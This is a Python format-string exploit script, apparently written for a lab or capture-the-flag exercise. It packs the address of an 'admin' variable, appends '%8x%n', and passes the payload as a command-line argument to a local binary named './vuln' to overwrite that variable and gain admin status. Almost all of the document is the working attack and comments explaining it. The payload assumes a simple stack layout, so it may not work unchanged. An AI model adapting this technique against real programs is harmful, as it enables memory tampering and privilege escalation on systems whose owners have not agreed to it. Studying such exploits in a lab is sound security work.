#!/usr/bin/env python3
import subprocess
import struct

# =============================================================================
# CONFIGURATION:
# -----------------------------------------------------------------------------
# Assume we have the address of the 'admin' variable.
# This address is stable if ASLR is disabled and the binary is not compiled as PIE.
# You should determine the actual address (e.g., using objdump or gdb).
#
# For example purposes, we use: 0x0804a02c
# -----------------------------------------------------------------------------
admin_addr = 0x0804a02c  # <<--- UPDATE THIS ADDRESS AS NEEDED

# =============================================================================
# PAYLOAD CONSTRUCTION:
# -----------------------------------------------------------------------------
# The goal is to overwrite the 4-byte 'admin' variable with a nonzero value.
# The %n specifier writes the number of characters printed so far.
#
# Steps:
#   1. Pack the target address in little-endian format.
#   2. Use padding in the format string to print a controlled number of characters.
#      (In this example, the printed count need not be exactly 1; any nonzero
#       value is sufficient to set admin to true.)
#   3. Append the '%n' specifier to write the printed count to the target address.
#
# Note: The printed count includes all characters output so far. Adjust the padding
# as needed to achieve the desired write value.
# -----------------------------------------------------------------------------

# Pack the address of 'admin'
payload = struct.pack("<I", admin_addr)

# Determine how many characters we want printed. For instance, printing 8 characters
# will cause 8 to be written to admin. Since any nonzero value is acceptable, 8 is fine.
#
# Adjust the padding width to 8 minus the number of bytes already printed if needed.
# For simplicity, we add a format specifier that prints 8 characters.
payload += b"%8x"  # This prints 8 hexadecimal characters (adding to the count)
payload += b"%n"   # This writes the total printed count to the address

print("Exploit payload (raw bytes):", payload)

# =============================================================================
# EXECUTE THE VULNERABLE PROGRAM WITH THE PAYLOAD:
# -----------------------------------------------------------------------------
# The vulnerable program takes the entire payload as a command-line argument.
# We pass the payload using an appropriate encoding (latin-1) so that byte values
# are preserved.
# -----------------------------------------------------------------------------
try:
    result = subprocess.run(["./vuln", payload.decode('latin-1')],
                            capture_output=True, text=True, check=True)
    print("Vulnerable program output:")
    print(result.stdout)
except subprocess.CalledProcessError as e:
    print("Error running the vulnerable program:")
    print(e.output)